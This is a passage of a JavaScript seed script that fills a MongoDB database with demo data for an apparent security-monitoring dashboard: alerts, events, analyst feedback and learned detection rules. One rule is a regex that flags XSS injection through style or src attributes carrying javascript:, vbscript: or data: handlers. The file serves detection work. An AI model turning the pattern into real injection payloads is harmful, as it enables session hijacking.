  { pattern:"(?:<[^>]*(?:style|src)\\s*=\\s*['\"]?(?:javascript|vbscript|data):)", flags:"ig", category:"xss", description:"Detects XSS via CSS/src attribute injection with protocol handlers", confidence:0.87, source:"evolved", generatedFrom:["req-0004","req-0067"], validationResults:{truePositives:165,falsePositives:7,trueNegatives:4200,falseNegatives:18}, status:"disabled", disabledAt:rta(2), disabledReason:"Too many false positives on rich-text editor content. Needs refinement.", hitCount:245, falsePositiveCount:35, createdAt:rta(40), updatedAt:rta(2) }
];

// ============ EVENTS ============
const mockEvents = [];
const eventTypes = ['SQL Injection Detection','XSS Payload Blocked','Credential Stuffing Alert','Command Injection Attempt','Path Traversal Blocked','Session Anomaly Detected','Rate Limit Exceeded','Brute Force Detected','Privilege Escalation Attempt','Data Export Flagged','API Abuse Detected','Geo Anomaly Alert'];
const eventActions = ['Blocked','Escalated','Passed','Audited','Challenged','Pending'];
const eventSevs = ['Critical','High','Medium','Low','Info'];
for (let i = 1; i <= 40; i++) {
  mockEvents.push({
    id: `EV-${1000+i}`,
    time: rta(168).toISOString(),
    ip: pick(ips),
    type: pick(eventTypes),
    action: pick(eventActions),
    severity: pick(eventSevs),
    createdAt: rta(168)
  });
}

// ============ FEEDBACKS ============
const mockFeedbacks = [];
const decisions = ['approve_block','reject_block','approve_allow','reject_allow'];
const analysts = ['Alice_SOC','Bob_SOC','Charlie_SOC','Diana_SOC','Eve_SOC'];
const feedbackReasons = [
  'Confirmed malicious payload targeting production database.',
  'False positive — legitimate admin performing maintenance.',
  'Correct block. Attack signature matches known threat actor TTPs.',
  'Incorrect allow — this was a slow credential stuffing attempt.',
  'Valid block. XSS payload would have compromised user sessions.',
  'False positive — automated testing tool, not actual attack.',
  'Confirmed data exfiltration attempt. Escalate to CERT.',
  'Normal user behavior misclassified as brute force.',
  'Correct identification of privilege escalation attempt.',
  'API abuse confirmed — rate limiting should be tightened.'
];
for (let i = 0; i < 20; i++) {
  mockFeedbacks.push({
    analystId: pick(analysts),
    decision: pick(decisions),
    reason: pick(feedbackReasons),
    createdAt: rta(168)
  });
}

// ============ SEED FUNCTION ============
async function seed() {
  try {
    console.log("Connecting to MongoDB at", MONGODB_URI);
    await mongoose.connect(MONGODB_URI);
    console.log("Connected.");
    const db = mongoose.connection.db;

    console.log("Clearing existing collections...");
    const collections = ['alerts','protectedservices','incidents','playbooks','evolutionchanges','learnedpatterns','events','feedbacks'];
    for (const c of collections) {
      try { await db.collection(c).deleteMany({}); } catch(e) { /* collection may not exist */ }
    }

    console.log("Seeding Alerts (150)...");
    await db.collection('alerts').insertMany(mockAlerts);

    console.log("Seeding Protected Services (5)...");
    await db.collection('protectedservices').insertMany(mockApps);

    console.log("Seeding Incidents (12)...");
    const insertedIncidents = await db.collection('incidents').insertMany(mockIncidents);
    const incidentIds = Object.values(insertedIncidents.insertedIds);

    // Link playbooks to incidents
    mockPlaybooks.forEach((pb, i) => { pb.incidentId = incidentIds[i % incidentIds.length]; });
    console.log("Seeding Playbooks (6)...");
    await db.collection('playbooks').insertMany(mockPlaybooks);

    console.log("Seeding Evolution Changes (11)...");
    await db.collection('evolutionchanges').insertMany(mockEvolutions);

    console.log("Seeding Learned Patterns (11)...");
    await db.collection('learnedpatterns').insertMany(mockLearnedPatterns);

    console.log("Seeding Events (40)...");
    await db.collection('events').insertMany(mockEvents);

    // Link feedbacks to alerts
    const insertedAlerts = await db.collection('alerts').find({}).toArray();
    mockFeedbacks.forEach((fb, i) => { fb.alertId = insertedAlerts[i % insertedAlerts.length]._id; });
    console.log("Seeding Feedbacks (20)...");
    await db.collection('feedbacks').insertMany(mockFeedbacks);

    console.log("\n✅ All demo data seeded successfully!");
    console.log(`   • 150 Alerts`);
    console.log(`   • 5 Protected Services`);
    console.log(`   • 12 Incidents`);
    console.log(`   • 6 Playbooks`);
    console.log(`   • 11 Evolution Changes`);
    console.log(`   • 11 Learned Patterns`);
    console.log(`   • 40 Events`);
    console.log(`   • 20 Feedbacks`);
  } catch (err) {
    console.error("Error during seeding:", err);
  } finally {
    await mongoose.disconnect();
    console.log("Disconnected.");
  }
}

seed();
